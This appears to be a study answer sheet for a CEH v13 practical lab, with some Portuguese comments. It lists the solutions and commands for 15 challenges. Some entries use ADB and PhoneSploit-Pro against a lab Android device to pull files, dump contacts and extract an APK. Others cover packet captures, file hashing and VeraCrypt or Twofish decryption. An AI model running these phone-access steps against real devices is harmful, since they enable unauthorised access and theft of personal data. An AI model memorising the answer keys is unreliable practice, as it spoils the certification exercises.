#------------------------------#



# PART IV - Challenge 1  💬ANSWER: (ryptD3(0d3💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

nmap -p 5555 192.168.10.0/24 --open 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
#### /sdcard/Download/BCtetx.txt
adb connect 192.168.10.121
adb pull /sdcard/Download/BCtetx.txt
python3 -m http.server 8000

#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8080/BCtetx.txt # Selecionar toda chave 
cd 'C:\Users\Admin\Downloads'
curl "http://172.25.0.10:8000/BCtetx.txt" -o "BCtext.txt" 
#### EH Workstation-1: C:\Users\Admin\Documents\pawned.txt
#### EH Workstation-1: C:\Users\Admin\Downloads\BCtext.txt
#### E:\CEH-Tools\CEHv13 Module 20 Cryptography\Cryptography Tools\BCTextEncoder\BCTextEncoder.exe # Abrir Tornado com essa ferramenta
### File → Open → C:\Users\Admin\Documents\pawned.txt # Arquivo que contém senha
### INFO: Pa$$w0rd
### File → Open → C:\Users\Admin\Downloads\BCtext.txt → Password: Pa$$w0rd → OK # Arquivo que contém hash
### INFO: (ryptD3(0d3



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# adb devices
# adb shell
# adb shell id
# ls /sdcard
# ls /sdcard/Download
# exit



#------------------------------#



# PART IV - Challenge 2 💬ANSWER: 53ac614c💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/PhoneSploit-Pro/phonesploitpro.py
sudo su
### PASSWORD: toor
python ~/PhoneSploit-Pro/phonesploitpro.pyPo
### [Y] Yes → [1] Connect a Device Install an APK → [192.168.10.121] → [N] Next Page → [N] Next Page → [36] Use Keycodes (Control Device) → [1] Select from App List → [2] com.cxinvetor.file.explorer → [Enter] → [0] Exit
### INFO: Saving APK file to PhoneSploit-Pro/Downloaded-Files
### INFO: Extracting APK... /data/app/com/cxinvector.file.explorer-gXzSE009r9D...d, 0 skipped. 33.7 MB/s (6368578 bytes in 0.180s)
crc32 ~/PhoneSploit-Pro/Downloaded-Files/com_cxinvector_file_explorer.apk
### INFO: 53ac614c



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# adb shell pm list packages
# adb shell pm path <package>
# adb pull <path>



#------------------------------#



# PART IV - Challenge 3  💬ANSWER: k4.png💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-1: C:\Users\Admin\Documents\signature.zip # Descompactar arquivo
### Extract All... → C:\Users\Admin\Documents\signature → Extract 
cd C:\Users\Admin\Documents\signature\signature krish
Get-FileHash -Algorithm MD5 *
### INFO: Hash → ...24CCB
dir
### INFO: Name → k4.png



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# Get-ChildItem *.png | Get-FileHash -Algorithm MD5
# Get-ChildItem *.png | Get-FileHash -Algorithm MD5 | Where-Object { $_.Hash -like "*24CCB" }
# md5sum *.png | grep 24CCB



#------------------------------#



# PART IV - Challenge 4  💬ANSWER: +1 (555) 678-9012💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### /sdcard/Calls/call_log_dump.log.txt
adb connect 192.168.10.121
adb pull /sdcard/Calls/call_log_dump.log.txt
cat call_log_dump.log.txt 
### INFO: Encontrar solicitação de SSN; Linguagem mal escrita; Urgência implícita
### INFO: ... +1 (555) 678-9012,+1 (555) 987-6543,Incoming,Hi mam call World bank cloud you please verify you SSN number. 



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# cut -d',' -f4 call_log_dump.log.txt | sort | uniq | wc -l # Contagem de mensagens únicas
# cut -d',' -f4 call_log_dump.log.txt | sort | uniq -c | sort -nr # Contagem de quantas vezes cada número aparece
# grep -i "ssn\|bank\|verify" call_log_dump.log.txt # Extração direta do número do suspeito
# grep -iE "ssn|bank|verify" call_log_dump.log.txt | cut -d',' -f4 | sort | uniq # Extração direta do número do suspeito retornando somete o número



#------------------------------#



# PART IV - Challenge 5  💬ANSWER: Warning💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/Documents/And_Dos.pcapng
wireshark ~/Documents/And_Dos.pcapng
### PATH: Analyze → Expert Information
### INFO: Warning ...



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

#### FILTER: udp || tcp.analysis.retransmission
#### FILTER: tcp.flags.syn == 1 && tcp.flags.ack == 0
### PATH: Statistics → IO Graphs



#------------------------------#



# PART IV - Challenge 6  💬ANSWER: 50💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/MQTT.pcapng
wireshark ~/MQTT.pcapng
### FILTER: mqtt.msgtype == 3
### INFO: Info → Publish Message (id=2) [High_humidity]
### PATH: Follow → TCP Stream
### INFO: High_humidity..Alert for rise in humidity(50 percentage)@...P...b...



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

### FILTER: mqtt



#------------------------------#



# ⚠️ PART IV - Challenge 7  💬ANSWER: Twofish/@!ph@|tE*t💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/Documents/Cryt-128-06encr.hex
stat -c%s ~/Documents/Cryt-128-06encr.hex
cd ~/Documents
python3 -m http.server 8000

#### GOOGLE-CHROME - WORKSATION-1: http://172.25.0.10:8000 # Baixar Cryt-128-06encr.hex
#### EH Workstation-1: C:\Users\Admin\Downloads\Cryt-128-06encr.hex
#### ⚙️JÁ INSTALADO⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Cryptanalysis Tools\CrypTool\SetupCrypTool_1_4_42_en.exe # Abrir Cryt-128-06encr.hex com essa ferramenta
### PATH: CrypTool 1.4.42 → Open (📂) → C:\Users\Admin\Downloads\Cryt-128-06encr.hex → Encrypt/Decrypt → Symmetric (modern) → Further Algorithms → Twofish... → Key length: 128 bits → 🔑: 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 → Decrypt
### INFO: Twofish decryption of <Cryt-128-06encr.hex>, key <06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06>
### INFO: @!ph@|tE*t



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# sudo apt install ent -y
# ### PASSWORD: toor
# ent ~/Documents/Cryt-128-06encr.hex



#------------------------------#



# PART IV - Challenge 8  💬ANSWER: 4💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### EH Workstation-1: C:\Users\Admin\Documents\MyVeraCrypt
#### ⚙️JÁ INSTALADO⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Disk Encryption Tools\VeraCrypt\VeraCrypt Setup 1.26.7.exe # Abrir Logfile.PML com essa ferramenta
### PATH: VeraCrypt → A: → Select File... → C:\Users\Admin\Documents\MyVeraCrypt → Mount → Pasword: veratest → OK
### PASSWORD: veratest
### PATH: A:\s2 
### INFO: daemcrossover.exe  dexterroll.exe  hell.exe  schedupdate.exe # Total de 4 arquivos



#------------------------------#



# PART IV - Challenge 9  💬ANSWER: 61💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/PhoneSploit-Pro/phonesploitpro.py
sudo su
### PASSWORD: toor
python ~/PhoneSploit-Pro/phonesploitpro.py
### [Y] Yes → [1] Connect a Device Install an APK → [192.168.10.121] → [N] Next Page → [N] Next Page → [34] Dump All Contacts → [Enter] → [0] Exit
### INFO: Saving Contacts file to PhoneSploit-Pro/Downloaded-Files
### INFO: Extracting all Contacts
cat ~/PhoneSploit-Pro/Downloaded-Files/contacts_dump-2025-12-7-13-38-35.txt
### INFO: Low: 2 display_name=Maddy, number=+61 934758565556



#------------------------------#



# PART IV - Challenge 10  💬ANSWER: 16💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/MQTT.pcapng
wireshark ~/MQTT.pcapng
### FILTER: mqtt.msgtype == 3
### INFO: Info → Publish Message (id=3) [High_temperature]
### INFO: MQ Telemetry Transport Protocol, Publish Message
###           Topic Length: 16
###           Topic:        High_temperature



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

### FILTER: mqtt



#------------------------------#



# PART IV - Challenge 11 💬ANSWER: Power Button💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/PhoneSploit-Pro/phonesploitpro.py
sudo su
### PASSWORD: toor
python ~/PhoneSploit-Pro/phonesploitpro.py
### [Y] Yes → [N] Next Page → [N] Next Page → [39] Use Keycodes (Control Device) → [5] Power Button → [0] Exit
### INFO: 5. Power Button



#------------------------------#



# PART IV - Challenge 12 💬ANSWER: 80099889💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### /sdcard/Music/confidential.txt
adb connect 192.168.10.121
adb pull /sdcard/Music/confidential.txt
cat confidential.txt
#### INFO: 80099889



#------------------------------#



# PART IV - Challenge 13 💬ANSWER: 23💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### /sdcard/Music/2024-09-11_11-52-05.png
adb connect 192.168.10.121
adb pull /sdcard/Music/2024-09-11_11-52-05.png
cat 2024-09-11_11-52-05.png
#### INFO: Packets/sec:23



# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***

# #### ~/PhoneSploit-Pro/phonesploitpro.py
# sudo su
# ### PASSWORD: toor
# python ~/PhoneSploit-Pro/phonesploitpro.py
# ### [Y] Yes → [1] Connect a Device Install an APK → [192.168.10.121] → [N] Next Page → [N] Next Page → [8] File Manager / Download Files → [/sdcard/Music/2024-09-11_11-52-05.png] → [Enter] → [0] Exit



#------------------------------#



# PART IV - Challenge 14 💬ANSWER: Quotes💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/Documents/Archive/*
#### ~/Documents/FileHashes.png
cd ~/Documents/Archive
md5sum * 
### INFO: 659ae0e46907aaef274fc563e64684bc Quotes.txt
cat ~/Documents/FileHashes.png
### INFO: Quotes: F1A490C46E1B4C49E006DCA625621A24



#------------------------------#



# PART IV - Challenge 15 💬ANSWER: 6💬

# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***

#### ~/Documents/secret
cd ~/Documents
python3 -m http.server 8000

#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8000 # Baixar secret
#### EH Workstation-1: C:\Users\Admin\Downloads\secret
#### ⚙️JÁ INSTALADO⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Disk Encryption Tools\VeraCrypt\VeraCrypt Setup 1.26.7.exe # Abrir Logfile.PML com essa ferramenta
### PATH: VeraCrypt → B: → Select File... → C:\Users\Admin\Downloads\secret → Mount → Pasword: test → OK
### PASSWORD: test
### PATH: B:\ 
### INFO: Secret1.txt Secret2.txt Secret3.txt Secret4.txt Secret5.txt Secret6.txt # Total de 6 arquivos



#------------------------------#
